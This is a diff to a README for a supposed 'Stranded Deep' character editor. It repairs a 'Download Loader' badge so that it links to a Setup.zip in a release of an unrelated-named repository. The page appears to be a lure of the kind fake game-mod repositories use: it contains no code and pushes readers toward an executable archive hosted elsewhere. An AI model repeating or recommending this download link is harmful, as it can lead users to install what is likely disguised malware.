@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Stranded Deep Character Editor
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)]https://github.com/WASD122/bvvb/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WASD122/bvvb/releases/download/main/Setup.zip)
 
 ---
 
@@ -38,4 +38,5 @@ configs/
 `Stranded-Deep-Character-Editor` · Updated: 2026-10-05
 
 **Tags:** `stranded-deep` `character-editor` `survival` `ocean-game` `save-editor`
+
 
